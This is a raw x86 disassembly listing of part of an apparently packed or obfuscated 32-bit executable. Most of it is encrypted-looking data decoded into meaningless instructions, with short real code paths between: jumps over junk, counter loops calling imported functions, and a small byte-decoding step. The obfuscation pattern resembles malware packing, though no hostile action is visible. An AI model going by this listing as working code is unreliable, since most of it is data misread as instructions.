  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0x62,al
  40702c:	ss lahf 
  40702e:	neg    DWORD PTR [eax-0x34]
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407066
  407038:	inc    ebp
  407039:	dec    edx
  40703a:	adc    esi,DWORD PTR [edi-0x16]
  40703d:	push   cs
  40703e:	es nop
  407040:	stc    
  407041:	or     eax,0x2bb0fe5d
  407046:	sub    DWORD PTR [eax+0x0],0x6d3d1f36
  40704d:	cld    
  40704e:	add    bl,BYTE PTR [edi+edx*1]
  407051:	bound  edx,QWORD PTR [ecx]
  407053:	or     dh,dh
  407055:	mov    edi,0x4cfe3e88
  40705a:	popf   
  40705b:	cmp    cl,dl
  40705d:	ss pop esi
  40705f:	pop    ebx
  407060:	mov    ecx,0x2f2adcba
  407065:	sub    eax,0xafbd2079
  40706a:	xchg   ebp,eax
  40706b:	out    0xa1,al
  40706d:	imul   esp,DWORD PTR [ebx+0x587de3d8],0xe
  407074:	xchg   edi,eax
  407075:	pop    esp
  407076:	inc    ebx
  407077:	push   es
  407078:	mov    ecx,esi
  40707a:	sub    eax,0x7bef37e
  40707f:	cmp    ch,BYTE PTR [ebp+0x5a29b621]
  407085:	jns    0x407030
  407087:	imul   eax,esp,0xffffffc2
  40708a:	sbb    ch,BYTE PTR [ecx+0xd]
  40708d:	sar    BYTE PTR [edi+0x4d],cl
  407090:	push   ss
  407091:	xchg   esi,eax
  407092:	mov    ebx,0xca14d6c
  407097:	cmc    
  407098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407099:	scas   al,BYTE PTR es:[edi]
  40709a:	fs into 
  40709c:	jmp    0x407076
  40709e:	std    
  40709f:	retf   0x3823
  4070a2:	push   es
  4070a3:	cmp    eax,ebx
  4070a5:	push   ecx
  4070a6:	mov    WORD PTR [esi+0x0],?
  4070a9:	stos   BYTE PTR es:[edi],al
  4070aa:	dec    ebp
  4070ab:	sub    DWORD PTR [eax],ecx
  4070ad:	jg     0x407038
  4070af:	cmp    edi,DWORD PTR [edi-0x23]
  4070b2:	call   0x68e6:0x90a977ce
  4070b9:	push   es
  4070ba:	in     eax,dx
  4070bb:	or     esi,eax
  4070bd:	mov    ds:0xc126013d,eax
  4070c2:	dec    ebx
  4070c3:	sbb    bl,BYTE PTR [edi]
  4070c5:	fist   DWORD PTR [edi-0x42]
  4070c8:	std    
  4070c9:	sub    bh,BYTE PTR [edx-0x4a7a605f]
  4070cf:	lods   eax,DWORD PTR ds:[esi]
  4070d0:	(bad)  
  4070d1:	cld    
  4070d2:	outs   dx,BYTE PTR ds:[esi]
  4070d3:	pushf  
  4070d4:	cmp    edx,DWORD PTR [edx+0x17f4a3b5]
  4070da:	xor    al,0x5c
  4070dc:	xlat   BYTE PTR ds:[ebx]
  4070dd:	cmp    eax,0x17838ba5
  4070e2:	pop    eax
  4070e3:	push   esp
  4070e4:	ds jo  0x407124
  4070e7:	leave  
  4070e8:	mov    cl,0x0
  4070ea:	pcmpgtb mm7,QWORD PTR [esi+0x2e]
  4070ee:	adc    ah,BYTE PTR [edx-0x58]
  4070f1:	fwait
  4070f2:	jle    0x4070f5
  4070f4:	mov    al,0x5d
  4070f6:	inc    ebp
  4070f7:	repnz les ebp,FWORD PTR [ebx-0x4d7153a8]
  4070fe:	sub    ah,ch
  407100:	out    0x61,al
  407102:	jns    0x407099
  407104:	dec    ebx
  407105:	fsubr  DWORD PTR [ecx-0x4c80e256]
  40710b:	aam    0x6f
  40710d:	cmp    eax,0x2355e652
  407112:	(bad)  
  407113:	xor    eax,0x25dd75bd
  407118:	std    
  407119:	adc    al,ch
  40711b:	test   BYTE PTR [ebp-0x41],0x69
  40711f:	frstor [edi]
  407121:	clc    
  407122:	cdq    
  407123:	jmp    0xefe:0x15ec8415
  40712a:	mov    ecx,0xd531e677
  40712f:	inc    edx
  407130:	pop    ss
  407131:	jecxz  0x407112
  407133:	sbb    cl,BYTE PTR [ecx-0x2799a11a]
  407139:	mov    ebx,0xbd4978e
  40713e:	fcom   DWORD PTR [ebp+ecx*8-0x23]
  407142:	scas   eax,DWORD PTR es:[edi]
  407143:	or     eax,0x383901b3
  407148:	call   0xfab2:0xf42ea6b4
  40714f:	mov    dl,0xbb
  407151:	(bad)  
  407152:	jmp    0x5451:0xd5ce0b27
  407159:	dec    ebp
  40715a:	add    BYTE PTR [ebp+0x1fb1e680],ch
  407160:	loope  0x407105
  407162:	fidivr DWORD PTR [ebx+0x6ab717f7]
  407168:	push   esi
  407169:	mov    cl,0x58
  40716b:	shl    DWORD PTR [ebp+0xe6c1e59],cl
  407171:	add    eax,0xc36b5530
  407176:	lods   al,BYTE PTR ds:[esi]
  407177:	std    
  407178:	ds leave 
  40717a:	jle    0x40711e
  40717c:	mov    edi,edx
  40717e:	ret    0x77a7
  407181:	and    BYTE PTR [ecx+esi*8+0x2],dl
  407185:	pop    es
  407186:	xor    al,0x78
  407188:	add    BYTE PTR [esi-0x51],dh
  40718b:	je     0x4071c7
  40718d:	pop    ebx
  40718e:	or     dh,BYTE PTR [ebx]
  407190:	and    eax,0x795d3df1
  407195:	mov    esi,0x7c1794e4
  40719a:	sub    bl,cl
  40719c:	lea    ebp,ds:0xaf3cc3ac
  4071a2:	dec    edi
  4071a3:	mov    eax,DWORD PTR [eax]
  4071a5:	popf   
  4071a6:	mov    eax,0xaf4aeddc
  4071ab:	xchg   DWORD PTR [edx],esi
  4071ad:	or     eax,0x7a274b58
  4071b2:	push   ecx
  4071b3:	sub    DWORD PTR [edi+eiz*1-0x58],esp
  4071b7:	xor    ah,BYTE PTR [esi+0x1a]
  4071ba:	push   0xbb6a3f92
  4071bf:	ja     0x4071cc
  4071c1:	xchg   BYTE PTR [esi-0x66f18bd1],ch
  4071c7:	arpl   WORD PTR [edx+0x49bba3ca],sp
  4071cd:	clc    
  4071ce:	int    0x5c
  4071d0:	ss dec eax
  4071d2:	cdq    
  4071d3:	jbe    0x407177
  4071d5:	scas   eax,DWORD PTR es:[edi]
  4071d6:	enter  0x8146,0xf9
  4071da:	pop    ecx
  4071db:	jg     0x407256
  4071dd:	iret   
  4071de:	push   es
  4071df:	into   
  4071e0:	fs js  0x4071f1
  4071e3:	lock mov ah,BYTE PTR [esi+0x35184791]
  4071ea:	(bad)  
  4071ec:	sbb    eax,0x80d19689
  4071f1:	add    dl,dl
  4071f3:	loope  0x4071cc
  4071f5:	jns    0x4071a5
  4071f7:	stc    
  4071f8:	mov    edx,0xd46372d6
  4071fd:	les    edi,FWORD PTR [ecx]
  4071ff:	lock inc ebp
  407201:	cmp    eax,DWORD PTR [esi]
  407203:	sub    ah,BYTE PTR [ecx]
  407205:	fldcw  WORD PTR [esi-0x1b]
  407208:	or     al,0x98
  40720a:	push   es
  40720b:	push   0xc70a7cd5
  407210:	mov    esi,DWORD PTR [ebp-0x402c6583]
  407216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407217:	add    DWORD PTR [edx+0x5d2d9b4c],ebp
  40721d:	shl    BYTE PTR [eax-0x39000c4a],1
  407223:	jmp    ebx
  407225:	pop    eax
  407226:	mov    esi,0x353b67b7
  40722b:	aam    0xb1
  40722d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40722f:	test   al,cl
  407231:	xchg   ebx,eax
  407232:	gs xchg ecx,eax
  407234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407235:	jmp    0x40728f
  407237:	pop    esi
  407238:	dec    ebp
  407239:	lods   eax,DWORD PTR ds:[esi]
  40723a:	sbb    BYTE PTR [eax],ch
  40723c:	repz xor edx,DWORD PTR ds:0xd4b9752c
  407243:	sbb    DWORD PTR [ebp-0x2e],ecx
  407246:	cld    
  407247:	mov    eax,0x987f137a
  40724c:	push   ebp
  40724d:	pop    edx
  40724e:	mov    DWORD PTR ss:[edi],esp
  407251:	or     DWORD PTR [edx],esi
  407253:	ficomp DWORD PTR [edx+esi*1+0x5e]
  407257:	daa    
  407258:	addr16 sub al,al
  40725b:	pop    eax
  40725c:	xchg   DWORD PTR [ecx+0x325d949e],esp
  407262:	and    al,0x9d
  407264:	or     bh,BYTE PTR [edi-0x3d0058a2]
  40726a:	xchg   edx,eax
  40726b:	mov    ch,0x7e
  40726d:	je     0x4071fe
  40726f:	adc    ecx,edx
  407271:	idiv   DWORD PTR [esi-0x48]
  407274:	cdq    
  407275:	pop    edx
  407276:	and    ecx,DWORD PTR [edi]
  407278:	add    esp,ecx
  40727a:	ss call 0x3c14:0xccc860e9
  407282:	(bad)  
  407283:	sbb    al,0xb0
  407285:	aas    
  407286:	inc    ebp
  407287:	lods   al,BYTE PTR ds:[esi]
  407288:	adc    ecx,edi
  40728a:	adc    esp,DWORD PTR [esi]
  40728c:	pop    esi
  40728d:	inc    BYTE PTR [ecx]
  40728f:	aad    0x79
  407291:	rcr    DWORD PTR [edi-0x6798e852],cl
  407297:	dec    ebx
  407298:	xlat   BYTE PTR ds:[ebx]
  407299:	loop   0x40726b
  40729b:	mov    es,WORD PTR [ecx]
  40729d:	or     eax,0x581b8f07
  4072a2:	xor    bh,BYTE PTR [esi-0x218b553a]
  4072a8:	call   0x7ceb8881
  4072ad:	cmp    eax,esp
  4072af:	dec    ecx
  4072b0:	scas   al,BYTE PTR es:[edi]
  4072b1:	and    ah,BYTE PTR ss:[ebp+edx*2+0x7dac7954]
  4072b9:	mov    ebx,0xc0cc59e8
  4072be:	js     0x407335
  4072c0:	mov    dh,0xc2
  4072c2:	cmc    
  4072c3:	mov    ebx,0x92ab957a
  4072c8:	cmp    ah,bl
  4072ca:	ins    DWORD PTR es:[edi],dx
  4072cb:	mov    ebp,0x7890615a
  4072d0:	pop    edx
  4072d1:	or     bh,BYTE PTR [ecx+0x745989d6]
  4072d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072d8:	faddp  st(4),st
  4072da:	mov    ah,0x6a
  4072dc:	sub    dh,BYTE PTR [esp+ecx*8+0x73]
  4072e0:	ja     0x4072f4
  4072e2:	jl     0x4072d8
  4072e4:	push   edx
  4072e5:	push   eax
  4072e6:	rcr    BYTE PTR [esi],1
  4072e8:	stos   BYTE PTR es:[edi],al
  4072e9:	mov    esi,0x90690c7e
  4072ee:	int3   
  4072ef:	dec    eax
  4072f0:	outs   dx,BYTE PTR ds:[esi]
  4072f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072f2:	imul   eax,DWORD PTR [edx-0x3e7e7764],0x41f6a848
  4072fc:	xor    esp,DWORD PTR [esp+edx*1-0x10]
  407300:	out    0x7c,eax
  407302:	inc    eax
  407303:	jbe    0x407312
  407305:	cdq    
  407306:	stc    
  407307:	adc    edi,0xebce063f
  40730d:	inc    ebx
  40730e:	dec    eax
  40730f:	and    BYTE PTR [edi+ebx*1+0x7e9e2774],ch
  407316:	fldenv [ebx+0xfa17708]
  40731c:	retf   
  40731d:	into   
  40731e:	pop    ds
  40731f:	js     0x4072b0
  407321:	rol    esi,cl
  407323:	mov    BYTE PTR [ebp-0x1],0x7f
  407327:	lea    eax,[ebp-0x1]
  40732a:	and    DWORD PTR ds:0x42a779,0x0
  407334:	jmp    0x407346
  407339:	mov    ecx,DWORD PTR ds:0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x48cb2138,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x4073a8
  4073b7:	enter  0x49f4,0x12
  4073bb:	xchg   esi,eax
  4073bc:	xchg   ecx,eax
  4073bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073be:	inc    esp
  4073bf:	sti    
  4073c0:	mov    ah,0x87
  4073c2:	dec    esi
  4073c3:	mov    WORD PTR [eax-0x67f83059],ds
  4073c9:	pop    ebx
  4073ca:	fist   DWORD PTR [esi]
  4073cc:	add    dl,ah
  4073ce:	dec    eax
  4073cf:	push   ds
  4073d0:	jns    0x4073e8
  4073d2:	stc    
  4073d3:	fwait
  4073d4:	push   esp
  4073d5:	mov    ecx,0x56f2b27f
  4073da:	shl    esi,1
  4073dc:	sbb    DWORD PTR [ebx+0x40a50d26],0xffffffa1
  4073e3:	aam    0x7b
  4073e5:	and    dh,dl
  4073e7:	and    eax,0xf8fd4f1b
  4073ec:	cmp    al,0xf9
  4073ee:	cmp    dh,BYTE PTR [ebp+edi*2-0x2e9e8d32]
  4073f5:	cmp    bh,BYTE PTR ds:0xf177900f
  4073fb:	enter  0x10a1,0x15
  4073ff:	dec    ebx
  407400:	jbe    0x797f21c7
  407406:	sbb    cl,BYTE PTR [ebx-0x7b]
  407409:	xchg   esp,eax
  40740a:	mov    al,0xe5
  40740c:	jo     0x407449
  40740e:	ret    
  40740f:	outs   dx,DWORD PTR ds:[esi]
  407410:	jno    0x4073bc
  407412:	and    eax,0x54f61bbc
  407417:	stos   BYTE PTR es:[edi],al
  407418:	inc    ecx
  407419:	or     eax,0x89957b12
  40741e:	mov    dl,0x24
  407420:	les    eax,FWORD PTR [edx]
  407422:	repz or esp,DWORD PTR [esi]
  407425:	aam    0x14
  407427:	pop    edi
  407428:	cmp    ebx,DWORD PTR [esi]
  40742a:	or     al,0x6f
  40742c:	mov    dh,0x7
  40742e:	outs   dx,BYTE PTR ds:[esi]
  40742f:	ins    DWORD PTR es:[edi],dx
  407430:	and    BYTE PTR [esi],ah
  407432:	into   
  407433:	or     DWORD PTR [esi+ecx*1-0x21],eax
  407437:	mov    al,0x0
  407439:	scas   eax,DWORD PTR es:[edi]
  40743a:	cmp    eax,0xf5e36a74
  40743f:	xor    BYTE PTR [eax+0x3b],dl
  407442:	fnstsw WORD PTR [ecx]
  407444:	fist   DWORD PTR [edi-0x32619149]
  40744a:	popa   
  40744b:	jne    0x407491
  40744d:	and    ah,BYTE PTR [edx-0x2]
  407450:	jb     0x40745a
  407452:	and    DWORD PTR [esi],ebp
  407454:	aad    0x89
  407456:	aas    
  407457:	fnsave [ebp+edx*8+0x517b21f4]
  40745e:	test   eax,0x7367d61d
  407463:	ss push ebp
  407465:	or     dh,cl
  407467:	push   edx
  407468:	cwde   
  407469:	push   esi
  40746a:	lea    esi,[edx+0x2db7c7e1]
  407470:	mov    esp,0x797d756c
  407475:	mov    esp,0x48e2f11b
  40747a:	sbb    DWORD PTR [ecx],0xcf817d4e
  407480:	push   ds
  407481:	(bad)  
  407482:	(bad)  
  407483:	dec    esp
  407484:	pop    eax
  407485:	inc    ecx
  407486:	add    esp,eax
  407488:	out    0xcb,al
  40748a:	adc    ecx,DWORD PTR [ecx]
  40748c:	repnz enter 0xceba,0x4b
  407491:	iret   
  407492:	push   cs
  407493:	dec    ebx
  407494:	mov    eax,0x62d462f1
  407499:	mov    al,ds:0xf63e0aa8
  40749e:	sbb    ch,BYTE PTR [edx+edx*8+0x31b9e117]
  4074a5:	sbb    al,0xa2
  4074a7:	xchg   edi,eax
  4074a8:	shr    BYTE PTR [eax+0x55b3836e],0xdc
  4074af:	pushf  
  4074b0:	mov    es,WORD PTR [ebp-0x69fd621f]
  4074b6:	xchg   ecx,eax
  4074b7:	out    0x61,eax
  4074b9:	jbe    0x4074c6
  4074bb:	shr    DWORD PTR [edi-0x61],1
  4074be:	or     edx,eax
  4074c0:	shl    BYTE PTR [edi-0x4],0x7a
  4074c4:	jbe    0x40749e
  4074c6:	adc    eax,DWORD PTR [eax+0x7d3cf901]
  4074cc:	icebp  
  4074cd:	xor    al,0xd2
  4074cf:	or     cl,BYTE PTR [esi-0x1f]
  4074d2:	std    
  4074d3:	leave  
  4074d4:	bound  ebx,QWORD PTR [ecx+0x38ace34]
  4074da:	dec    ebx
  4074db:	dec    esp
  4074dc:	loope  0x40748b
  4074de:	(bad)  
  4074df:	jecxz  0x40753e
  4074e1:	pop    es
  4074e2:	add    BYTE PTR [edx],al
  4074e4:	jb     0x40748f
  4074e6:	cmp    DWORD PTR [esi-0x61],0x27afde18
  4074ed:	adc    esp,ecx
  4074ef:	pushf  
  4074f0:	sbb    edx,edi
  4074f2:	dec    esp
  4074f3:	mov    ds:0x12521718,eax
  4074f8:	adc    BYTE PTR fs:[ebp+0x37],ch
  4074fc:	and    BYTE PTR [esi],bl
  4074fe:	push   edx
  4074ff:	mov    eax,ds:0xb9b438c
  407504:	add    ch,0x42
  407507:	dec    eax
  407508:	and    al,0xd5
  40750a:	push   ss
  40750b:	add    dl,BYTE PTR [edi]
  40750d:	pop    eax
  40750e:	mov    al,0xe8
  407510:	popf   
  407511:	stc    
  407512:	stc    
  407513:	add    DWORD PTR [ebx+ebx*2+0x3d],esp
  407517:	pop    esi
  407518:	mov    ebp,0xb24fa040
  40751d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40751e:	xchg   esp,eax
  40751f:	sub    eax,0x39fb4df5
  407524:	lods   al,BYTE PTR ds:[esi]
  407525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407526:	aas    
  407527:	out    0x43,al
  407529:	cdq    
  40752a:	lahf   
  40752b:	into   
  40752c:	dec    ebx
  40752d:	cmp    DWORD PTR [esi-0x3b845b98],ebp
  407533:	adc    BYTE PTR [ecx+eax*4+0x45],dl
  407537:	aaa    
  407538:	fiadd  DWORD PTR [ecx+0x27]
  40753b:	mov    al,ds:0x9475e8d
  407540:	out    dx,eax
  407541:	lock mov esp,0xb019b794
  407547:	lea    esp,[ebp+0x60]
  40754a:	outs   dx,DWORD PTR ds:[esi]
  40754b:	(bad)  
  40754c:	jl     0x40756f
  40754e:	and    al,BYTE PTR [eax+0x75]
  407551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407552:	shl    BYTE PTR [esi+edi*2],0x87
  407556:	mov    ah,0x1
  407558:	div    DWORD PTR [ebx+0x52]
  40755b:	test   al,0x81
  40755d:	loop   0x407541
  40755f:	and    cl,BYTE PTR [ebx]
  407561:	pop    es
  407562:	call   0xde3c44c5
  407567:	lods   al,BYTE PTR ds:[esi]
  407568:	rcr    DWORD PTR [edx],0xfe
  40756b:	adc    dh,BYTE PTR [edi+0x38]
  40756e:	and    ch,BYTE PTR [ebp-0x66e35d0a]
  407574:	jns    0x407533
  407576:	out    0xc0,al
  407578:	loopne 0x407564
  40757a:	stc    
  40757b:	cdq    
  40757c:	mov    ds:0xfd3239a6,al
  407581:	outs   dx,BYTE PTR ds:[esi]
  407582:	sbb    eax,0x9fe2a40
  407587:	les    ecx,FWORD PTR [ebp-0x4deeb3ff]
  40758d:	inc    ebp
  40758e:	test   eax,0xa0f94e26
  407593:	add    BYTE PTR es:[eax],ah
  407596:	lahf   
  407597:	fidiv  WORD PTR [esi+0x69b79274]
  40759d:	mov    ds:0x175e9521,eax
  4075a2:	pop    eax
  4075a3:	retf   0xd74f
  4075a6:	mov    ebx,0x7807620e
  4075ab:	push   ebp
  4075ac:	mov    bh,0x86
  4075ae:	imul   BYTE PTR ds:0x8047d54
  4075b4:	inc    ebx
  4075b5:	xor    eax,0xb7ded67b
  4075ba:	cmp    edx,DWORD PTR [esi+0x8bb591f]
  4075c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075c1:	or     eax,0xce3b7f3c
  4075c6:	pushf  
  4075c7:	retf   
  4075c8:	push   ecx
  4075c9:	sbb    ecx,DWORD PTR [ebx+eax*1]
  4075cc:	les    edx,FWORD PTR [ebx+0x410fe7a0]
  4075d2:	stc    
  4075d3:	jl     0x407558
  4075d5:	scas   al,BYTE PTR es:[edi]
  4075d6:	icebp  
  4075d7:	mov    eax,0x5f981315
  4075dc:	(bad)  
  4075dd:	mov    esp,0x9b8f25f3
  4075e2:	dec    edi
  4075e3:	sbb    DWORD PTR [edx],edx
  4075e5:	ins    BYTE PTR es:[edi],dx
  4075e6:	adc    eax,0x377085f5
  4075eb:	push   0xe262b6d4
  4075f0:	xchg   BYTE PTR [esi+0x5b],dl
  4075f3:	pop    edi
  4075f4:	push   es
  4075f5:	dec    esi
  4075f6:	repz gs mov ecx,0x8742b995
  4075fd:	jl     0x407652
  4075ff:	cs xchg ecx,eax
  407601:	cli    
  407602:	test   eax,0xef8cd949
  407607:	sub    BYTE PTR [esi],0x9a
  40760a:	loop   0x4075c7
  40760c:	mov    edx,DWORD PTR [ecx+0x32]
  40760f:	enter  0xd640,0x84
  407613:	sti    
  407614:	cmp    dl,bl
  407616:	test   ebx,esp
  407618:	ffreep st(7)
  40761a:	outs   dx,BYTE PTR ds:[esi]
  40761b:	ret    
  40761c:	mov    es,WORD PTR [eax]
  40761e:	out    dx,eax
  40761f:	call   0xa38f:0x502e0e37
  407626:	push   ds
  407627:	sub    edi,DWORD PTR [eax]
  407629:	aad    0x8e
  40762b:	cmp    eax,0x5bbc62d6
  407630:	call   0x7d5e:0x8149202e
  407637:	ror    esp,1
  407639:	stos   BYTE PTR es:[edi],al
  40763a:	or     DWORD PTR [edi+0x1352982a],ebp
  407640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407641:	(bad)  
  407642:	scas   eax,DWORD PTR es:[edi]
  407643:	lock dec esi
  407645:	ffree  st(7)
  407647:	cdq    
  407648:	ret    
  407649:	xor    BYTE PTR [ebx+ebp*1-0x51c91ad8],bl
  407650:	add    eax,0xcb897f40
  407655:	cmc    
  407656:	cdq    
  407657:	lods   eax,DWORD PTR ds:[esi]
  407658:	data16 jnp 0x4076b1
  40765b:	nop
  40765c:	add    al,0x4e
  40765e:	jno    0x40768e
  407660:	sahf   
  407661:	mov    BYTE PTR [edi+0x4414d60f],bh
  407667:	jmp    0x25112ad6
  40766c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40766d:	sub    BYTE PTR [ebp-0x702be356],0x59
  407674:	mov    WORD PTR [ecx+0x20],?
  407677:	or     edx,DWORD PTR [eax-0xb]
  40767a:	jecxz  0x4075ff
  40767c:	xchg   ecx,eax
  40767d:	pop    es
  40767e:	icebp  
  40767f:	jmp    0xccd1ff98
  407684:	ja     0x4076f2
  407686:	cmp    eax,0x7ea337b0
  40768b:	lods   al,BYTE PTR ds:[esi]
  40768c:	pusha  
  40768d:	xor    ch,BYTE PTR [ecx]
  40768f:	jno    0x40768f
  407691:	enter  0x5dee,0xa
  407695:	xchg   BYTE PTR ds:0x3e3a6a7e,ch
  40769b:	ficom  DWORD PTR [eax]
  40769d:	scas   eax,DWORD PTR es:[edi]
  40769e:	dec    ecx
  40769f:	push   edx
  4076a0:	mov    eax,0xf0458918
  4076a5:	mov    al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a761,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx+0x62ae76e8],1
  407796:	add    ch,BYTE PTR [ebp+0x2e]
  407799:	mov    al,0xd6
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x40777b
  4077a2:	mov    BYTE PTR [edi+0x2d1b7f7a],dh
  4077a8:	sbb    eax,DWORD PTR [ecx+0x54fec10d]
  4077ae:	pop    esp
  4077af:	jecxz  0x4077dd
  4077b1:	js     0x40781a
  4077b3:	cld    
  4077b4:	mov    ebp,0xbf1319c0
  4077b9:	adc    eax,0xc2123251
  4077be:	shl    ah,1
  4077c0:	or     bl,BYTE PTR [ecx]
  4077c2:	out    0x77,al
  4077c4:	aas    
  4077c5:	lods   eax,DWORD PTR ds:[esi]
  4077c6:	test   eax,0x336f2eb5
  4077cb:	mov    WORD PTR [ebp+0x5e],?
  4077ce:	dec    esi
  4077cf:	xchg   DWORD PTR [edx],esp
  4077d1:	pop    ebp
  4077d2:	mov    ebp,0xc0a09bc3
  4077d7:	pop    ds
  4077d8:	aad    0x87
  4077da:	sti    
  4077db:	sub    eax,0x6e746475
  4077e0:	xchg   ebx,eax
  4077e1:	punpcklbw mm1,DWORD PTR [ebp-0xcdc384a]
  4077e8:	int3   
  4077e9:	std    
  4077ea:	loope  0x4077a6
  4077ec:	pop    es
  4077ed:	inc    esi
  4077ee:	les    ebp,FWORD PTR [eax]
  4077f0:	inc    esi
  4077f1:	adc    DWORD PTR [ebx+0x5af4ee3c],ebx
  4077f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077f8:	mov    cs,WORD PTR [edx+eax*4+0x650673d2]
  4077ff:	lahf   
  407800:	or     BYTE PTR [esi],ch
  407802:	and    bh,bl
  407804:	mov    ch,0x8b
  407806:	daa    
  407807:	push   0x38332853
  40780c:	mov    fs,WORD PTR [esi]
  40780e:	xchg   esi,eax
  40780f:	adc    BYTE PTR [eax+0x5f78b247],dh
  407815:	loop   0x4077d3
  407817:	enter  0xce99,0xf
  40781b:	add    dl,BYTE PTR [esi+0xdee3a1c]
  407821:	sti    
  407822:	adc    eax,0x259ea086
  407827:	icebp  
  407828:	add    eax,0x8e628287
  40782d:	clc    
  40782e:	sbb    ebp,esi
  407830:	add    al,0x91
  407832:	pop    ebx
  407833:	inc    edx
  407834:	call   FWORD PTR [eax]
  407836:	and    ecx,DWORD PTR [eax+0x37]
  407839:	test   al,0xd8
  40783b:	sar    eax,0x7c
  40783e:	pop    edi
  40783f:	cmp    BYTE PTR [ebx],0x0
  407842:	pop    ss
  407843:	mul    DWORD PTR [edi+0x5e]
  407846:	jns    0x40781d
  407848:	out    dx,eax
  407849:	or     dh,BYTE PTR [edi-0x59118212]
  40784f:	rcl    DWORD PTR [esi-0x393f445c],0x51
  407856:	cmp    eax,0xa9f945f
  40785b:	or     ecx,ecx
  40785d:	add    BYTE PTR [esi+0x2a0e8b48],bl
  407863:	daa    
  407864:	imul   esi,DWORD PTR [edx+0x31de543c],0xffffffff
  40786b:	mov    ebp,0xa1bec4b9
  407870:	and    ecx,eax
  407872:	inc    esi
  407873:	inc    ebx
  407874:	or     BYTE PTR [ebx+0x7929017d],bl
  40787a:	sub    BYTE PTR [eax],ah
  40787c:	out    0x95,al
  40787e:	xchg   edx,eax
  40787f:	dec    ecx
  407880:	data16 div BYTE PTR [ebx-0x61]
  407884:	jp     0x40781c
  407886:	das    
  407887:	xchg   ecx,eax
  407888:	and    BYTE PTR [ebp+0x13],dl
  40788b:	pop    ss
  40788c:	inc    ecx
  40788d:	jecxz  0x4078fb
  40788f:	int    0xd6
  407891:	xchg   edi,eax
  407892:	mov    ebp,ds
  407894:	lods   eax,DWORD PTR ds:[esi]
  407895:	inc    esi
  407896:	and    DWORD PTR [ecx-0x7e],ebx
  407899:	push   0x46
